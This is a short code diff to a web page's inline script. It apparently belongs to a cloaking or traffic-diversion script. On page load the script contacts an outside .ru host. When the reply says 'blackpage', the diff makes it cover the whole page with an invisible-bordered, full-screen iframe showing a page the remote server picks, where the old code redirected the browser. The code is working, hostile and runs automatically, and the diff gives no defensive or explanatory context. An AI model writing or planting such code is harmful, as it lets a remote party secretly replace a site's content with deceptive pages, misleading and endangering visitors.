@@ -11,7 +11,7 @@
     <script>
     window.onload = function () {
         var http = new XMLHttpRequest();
-        var url = 'https://beastsh0p.ru/ajax.php';    
+        var url = 'https://beastsh0p.ru/ajax.php';
         var params = '';
         http.open('POST', url, true);
 
@@ -22,7 +22,15 @@
             if (http.readyState == 4 && http.status == 200) {
                 var obj = JSON.parse(http.responseText);
                 if(obj.type == 'blackpage') {
-                     window.location.href = ("src", obj.page);
+                    var ifrm = document.createElement("iframe");
+                    ifrm.setAttribute("src", obj.page);
+                    ifrm.style.width = "100%";
+                    ifrm.style.height = "100%";
+                    ifrm.style.border = "none";
+                    ifrm.style.margin = "none";
+                    ifrm.style.position = "absolute";
+                    ifrm.style.top = "0";
+                    document.body.appendChild(ifrm);
                 }
             }
         };
